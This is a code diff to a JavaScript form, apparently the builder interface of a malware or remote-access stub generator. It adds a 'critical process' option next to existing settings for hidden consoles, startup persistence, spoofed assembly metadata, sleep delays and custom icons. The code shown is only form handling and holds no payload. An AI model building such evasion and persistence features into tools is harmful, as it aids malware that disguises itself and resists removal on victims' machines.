@@ -109,6 +109,7 @@ function saveFormSettings() {
       startupName: document.getElementById("startup-name")?.value ?? "",
       hideConsole: document.querySelector('input[name="hide-console"]')?.checked ?? false,
       requireAdmin: document.querySelector('input[name="require-admin"]')?.checked ?? false,
+      criticalProcess: document.querySelector('input[name="critical-process"]')?.checked ?? false,
       assemblyTitle: document.getElementById("assembly-title")?.value ?? "",
       assemblyProduct: document.getElementById("assembly-product")?.value ?? "",
       assemblyCompany: document.getElementById("assembly-company")?.value ?? "",
@@ -161,6 +162,7 @@ function restoreFormSettings() {
     if (s.startupName !== undefined) setVal("startup-name", s.startupName);
     if (s.hideConsole !== undefined) setCb('input[name="hide-console"]', s.hideConsole);
     if (s.requireAdmin !== undefined) setCb('input[name="require-admin"]', s.requireAdmin);
+    if (s.criticalProcess !== undefined) setCb('input[name="critical-process"]', s.criticalProcess);
     if (s.assemblyTitle !== undefined) setVal("assembly-title", s.assemblyTitle);
     if (s.assemblyProduct !== undefined) setVal("assembly-product", s.assemblyProduct);
     if (s.assemblyCompany !== undefined) setVal("assembly-company", s.assemblyCompany);
@@ -586,6 +588,7 @@ form?.addEventListener("submit", async (e) => {
   const assemblyVersion = form.querySelector("#assembly-version")?.value.trim() || "";
   const assemblyCopyright = form.querySelector("#assembly-copyright")?.value.trim() || "";
   const requireAdmin = form.querySelector('input[name="require-admin"]')?.checked || false;
+  const criticalProcess = form.querySelector('input[name="critical-process"]')?.checked || false;
   const outputExtension = form.querySelector("#output-extension")?.value || ".exe";
   const sleepSecondsRaw = parseInt(form.querySelector("#sleep-seconds")?.value || "0", 10);
   const sleepSeconds = !isNaN(sleepSecondsRaw) && sleepSecondsRaw > 0 ? sleepSecondsRaw : 0;
@@ -614,6 +617,7 @@ form?.addEventListener("submit", async (e) => {
     assemblyVersion: assemblyVersion || undefined,
     assemblyCopyright: assemblyCopyright || undefined,
     requireAdmin,
+    criticalProcess,
     outputExtension,
     sleepSeconds: sleepSeconds > 0 ? sleepSeconds : undefined,
     iconBase64: pendingIconBase64 || undefined,
